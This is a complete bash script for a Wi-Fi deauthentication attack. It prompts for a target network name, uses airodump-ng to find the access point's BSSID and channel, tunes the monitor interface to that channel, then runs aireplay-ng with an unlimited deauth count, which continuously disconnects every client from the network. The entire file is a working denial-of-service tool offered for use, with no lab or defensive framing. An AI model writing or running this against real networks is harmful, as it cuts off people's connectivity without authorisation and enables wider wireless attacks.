#!/bin/bash

# Prompt for variables
read -p "Enter the SSID of the target AP: " ssid
read -p "Enter your monitor mode interface (e.g., wlan0mon): " iface

# Scan to find BSSID
echo "[*] Scanning for BSSID of '$ssid'..."
timeout 10 airodump-ng --essid "$ssid" --write-interval 1 --output-format csv -w /tmp/deauth_scan "$iface" >/dev/null 2>&1

bssid=$(grep "$ssid" /tmp/deauth_scan-01.csv | head -n 1 | cut -d',' -f1 | tr -d ' ')
channel=$(grep "$ssid" /tmp/deauth_scan-01.csv | head -n 1 | cut -d',' -f4 | tr -d ' ')

if [ -z "$bssid" ]; then
    echo "[!] Could not find AP with SSID: $ssid"
    exit 1
fi

echo "[+] Found AP - BSSID: $bssid | Channel: $channel"

# Set interface to correct channel
echo "[*] Setting $iface to channel $channel..."
iwconfig "$iface" channel "$channel"

# Start deauth attack
echo "[*] Sending deauth packets to $bssid on channel $channel..."
aireplay-ng --deauth 0 -a "$bssid" "$iface"
